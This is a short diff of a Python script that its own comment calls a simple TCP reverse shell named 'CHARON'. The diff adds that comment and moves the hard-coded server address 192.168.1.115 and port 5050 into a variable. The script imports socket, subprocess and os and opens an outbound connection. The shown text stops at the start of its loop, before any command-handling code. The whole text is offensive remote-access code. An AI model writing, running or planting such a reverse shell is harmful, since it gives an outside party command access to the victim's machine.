@@ -1,9 +1,15 @@
+# CHARON :
+# socket program for create simple tcp revese shell on port 5050 for server [Best Shell]
+
 from socket import *
 import subprocess
 import os
 
+#server ip :
+ip = "192.168.1.115"
+
 s = socket(AF_INET, SOCK_STREAM)
-s.connect(("192.168.1.115",5050))
+s.connect((ip,5050))         
 
 while True:
 
